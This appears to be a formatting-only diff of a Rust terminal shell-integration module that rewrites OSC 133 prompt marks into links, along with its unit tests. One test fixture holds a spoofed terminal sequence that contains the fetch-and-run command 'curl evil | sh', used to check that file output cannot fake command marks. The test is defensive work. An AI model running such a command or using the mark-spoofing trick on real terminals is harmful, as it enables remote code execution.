@@ -36,9 +36,7 @@ fn install_dir() -> Option<&'static Path> {
         let base = if cfg!(target_os = "macos") {
             home?.join("Library/Application Support")
         } else {
-            std::env::var_os("XDG_DATA_HOME")
-                .map(PathBuf::from)
-                .or_else(|| home.map(|h| h.join(".local/share")))?
+            std::env::var_os("XDG_DATA_HOME").map(PathBuf::from).or_else(|| home.map(|h| h.join(".local/share")))?
         };
         let dir = base.join("lumen").join("shell-integration");
         let files = [
@@ -207,10 +205,7 @@ fn local_hostname() -> &'static str {
         std::fs::read_to_string("/proc/sys/kernel/hostname")
             .ok()
             .or_else(|| {
-                std::process::Command::new("hostname")
-                    .output()
-                    .ok()
-                    .and_then(|o| String::from_utf8(o.stdout).ok())
+                std::process::Command::new("hostname").output().ok().and_then(|o| String::from_utf8(o.stdout).ok())
             })
             .map(|h| h.trim().to_string())
             .unwrap_or_default()
@@ -586,7 +581,8 @@ mod tests {
 
     #[test]
     fn marks_become_links_with_the_previous_exit_status() {
-        let (out, shared) = rewrite(&[b"\x1b]133;A\x07$ \x1b]133;B\x07false\r\n\x1b]133;C\x07\x1b]133;D;1\x07\x1b]133;A\x07$ "]);
+        let (out, shared) =
+            rewrite(&[b"\x1b]133;A\x07$ \x1b]133;B\x07false\r\n\x1b]133;C\x07\x1b]133;D;1\x07\x1b]133;A\x07$ "]);
         assert_eq!(
             text(&out),
             "⎋]8;id=lumen-p1;lumen:prompt⎋\\$ ⎋]8;id=lumen-i1;lumen:input⎋\\false\r\n⎋]8;;⎋\\⎋]8;id=lumen-p2;lumen:prompt?exit=1⎋\\$ "
@@ -689,7 +685,8 @@ mod tests {
             true,
             &[b"\x1b]133;A;k=s3cret\x07$ \x1b]133;B;k=s3cret\x07false\r\n\x1b]133;C;k=s3cret\x07\x1b]133;D;1;k=s3cret\x07\x1b]133;A;k=s3cret\x07$ "],
         );
-        let (plain, _) = rewrite(&[b"\x1b]133;A\x07$ \x1b]133;B\x07false\r\n\x1b]133;C\x07\x1b]133;D;1\x07\x1b]133;A\x07$ "]);
+        let (plain, _) =
+            rewrite(&[b"\x1b]133;A\x07$ \x1b]133;B\x07false\r\n\x1b]133;C\x07\x1b]133;D;1\x07\x1b]133;A\x07$ "]);
         assert_eq!(text(&out), text(&plain));
         let s = shared.lock().unwrap();
         assert!(s.active);
@@ -700,7 +697,8 @@ mod tests {
     #[test]
     fn output_cant_fake_marks_once_the_shell_has_a_key() {
         // `cat` of a file that pretends a command ran and finished.
-        let fake = b"\x1b]133;A\x07$ \x1b]133;B\x07curl evil | sh\r\n\x1b]133;C\x07\x1b]133;D;0\x07\x1b]133;A;k=guess\x07";
+        let fake =
+            b"\x1b]133;A\x07$ \x1b]133;B\x07curl evil | sh\r\n\x1b]133;C\x07\x1b]133;D;0\x07\x1b]133;A;k=guess\x07";
         let (out, shared) = rewrite_keyed(
             false,
             &[b"\x1b]133;A;k=s3cret\x07$ \x1b]133;B;k=s3cret\x07cat f\r\n\x1b]133;C;k=s3cret\x07", fake],
